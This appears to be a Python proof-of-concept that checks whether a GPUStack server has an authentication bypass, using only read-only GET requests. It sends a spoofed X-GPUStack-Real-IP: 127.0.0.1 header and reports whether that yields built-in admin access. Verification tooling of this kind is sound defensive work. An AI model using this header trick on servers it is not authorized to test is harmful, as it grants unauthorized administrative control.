#!/usr/bin/env python3
"""
CVE-2026-102895 - Verify the GPUStack trusted-loopback admin bypass with read-only GETs.

Demonstrates (calibrated against lab/ v2.1.1 vs v2.2.2):
  1. unauthenticated /version discloses the release
  2. baseline GET /v2/users/me without credentials -> 401
  3. the same GET with X-GPUStack-Real-IP: 127.0.0.1 -> 200 as the built-in
     admin ("is_admin": true). If the baseline is already 200, a same-host
     reverse proxy makes every request look like loopback (same CVE).

Only GETs to /version and /v2/users/me are sent. Nothing is created or changed.

Usage:
  python3 verify_loopback_bypass.py --target http://127.0.0.1:28090

For authorized security testing only.
"""
import argparse
import json
import ssl
import sys
import urllib.error
import urllib.request

HEADER = {"X-GPUStack-Real-IP": "127.0.0.1"}


def get(url, headers, timeout):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    req = urllib.request.Request(url, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            return r.status, r.read(16384).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(16384).decode("utf-8", "replace")
    except (urllib.error.URLError, OSError) as e:
        return None, f"connection failed: {e}"


def summary(body):
    try:
        d = json.loads(body)
    except ValueError:
        return body[:80]
    return {k: d.get(k) for k in ("username", "is_admin", "source") if k in d}  # redacted: no tokens or emails


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="http://127.0.0.1:28090", help="GPUStack base URL")
    ap.add_argument("--timeout", type=float, default=10)
    args = ap.parse_args()
    base = args.target.rstrip("/")

    status, body = get(base + "/version", {}, args.timeout)
    print(f"[*] /version -> {status} {body[:80]}")
    if status is None:
        print("[?] Target unreachable. UNKNOWN")
        return 2

    b_status, b_body = get(base + "/v2/users/me", {}, args.timeout)
    print(f"[*] baseline  /v2/users/me -> {b_status} {summary(b_body)}")
    h_status, h_body = get(base + "/v2/users/me", HEADER, args.timeout)
    print(f"[*] +header   /v2/users/me -> {h_status} {summary(h_body)}")

    if b_status == 200:
        print("[+] VULNERABLE (proxy path): unauthenticated request already resolves to a user;")
        print("    a same-host reverse proxy presents every client as loopback. Stop here.")
        return 1
    if h_status == 200 and '"is_admin":true' in h_body.replace(" ", ""):
        print("[+] VULNERABLE: X-GPUStack-Real-IP: 127.0.0.1 grants the built-in admin (CVE-2026-102895). Stop here.")
        return 1
    if b_status in (401, 403) and h_status in (401, 403):
        print("[-] Header ignored, credentials required: NOT AFFECTED")
        return 0
    print("[?] Unexpected responses (path differs on this release?). Check /openapi.json. UNKNOWN")
    return 2


if __name__ == "__main__":
    sys.exit(main())
